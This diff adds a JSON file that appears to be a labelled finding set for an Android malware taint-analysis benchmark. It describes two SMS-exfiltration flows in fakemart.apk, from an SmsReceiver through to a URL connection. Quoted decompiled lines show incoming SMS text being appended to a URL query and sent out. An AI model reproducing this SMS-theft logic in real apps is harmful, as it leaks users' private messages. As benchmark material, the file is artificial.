@@ -1,0 +1,132 @@
+{
+  "fileName": "fakemart.apk",
+  "day": "2019-09-26",
+  "findings": [
+    {
+      "source": {
+        "statement": "String SuperMessage = SmsMessage.createFromPdu((byte[]) pdus[0]).getMessageBody();",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.android.blackmarket.SmsReceiver",
+        "lineNo": 29,
+        "targetName": "createFromPdu",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = staticinvoke <android.telephony.gsm.SmsMessage: android.telephony.gsm.SmsMessage createFromPdu(byte[])>($r8)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "BufferedInputStream bis = new BufferedInputStream(ucon.getInputStream());",
+        "methodName": "public static synchronized String GetSourceURL(String urlsx)",
+        "className": "com.android.blackmarket.function",
+        "lineNo": 221,
+        "targetName": "getInputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<java.net.URLConnection: java.io.InputStream getInputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "SuperMessage23 = function.StringCRT(SuperMessage);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.blackmarket.SmsReceiver",
+          "lineNo": 39,
+          "decompiledSourceLineNo": 32,
+          "ID": 1
+        },
+        {
+          "statement": "function.GetSourceURL(function.GetGlobalString(\"URI\", CN) + \"?idajax=\" + function.UrlEncode(INFO + \",\" + SuperMessage23));",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.blackmarket.SmsReceiver",
+          "lineNo": 44,
+          "decompiledSourceLineNo": 33,
+          "ID": 2
+        },
+        {
+          "statement": "URL url = new URL(urlsx);",
+          "methodName": "public static synchronized String GetSourceURL(String urlsx)",
+          "className": "com.android.blackmarket.function",
+          "lineNo": 211,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads incoming SMSs and posts them to a URL.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "String SuperMessage = SmsMessage.createFromPdu((byte[]) pdus[0]).getMessageBody();",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.android.blackmarket.SmsReceiver",
+        "lineNo": 29,
+        "targetName": "createFromPdu",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = staticinvoke <android.telephony.gsm.SmsMessage: android.telephony.gsm.SmsMessage createFromPdu(byte[])>($r8)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "BufferedInputStream bis = new BufferedInputStream(ucon.getInputStream());",
+        "methodName": "public static synchronized String GetSourceURL(String urlsx)",
+        "className": "com.android.blackmarket.function",
+        "lineNo": 221,
+        "targetName": "getInputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r5.<java.net.URLConnection: java.io.InputStream getInputStream()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "SuperMessage23 = function.StringCRT(SuperMessage);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.blackmarket.SmsReceiver",
+          "lineNo": 57,
+          "decompiledSourceLineNo": 42,
+          "ID": 2
+        },
+        {
+          "statement": "function.GetSourceURL(function.GetGlobalString(\"URI\", CN) + \"?idajax=\" + function.UrlEncode(INFO + \",\" + SuperMessage23));",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.android.blackmarket.SmsReceiver",
+          "lineNo": 59,
+          "decompiledSourceLineNo": 43,
+          "ID": 2
+        },
+        {
+          "statement": "URL url = new URL(urlsx);",
+          "methodName": "public static synchronized String GetSourceURL(String urlsx)",
+          "className": "com.android.blackmarket.function",
+          "lineNo": 211,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads incoming SMSs and posts them to a URL.",
+      "isNegative": false
+    }
+  ]
+}
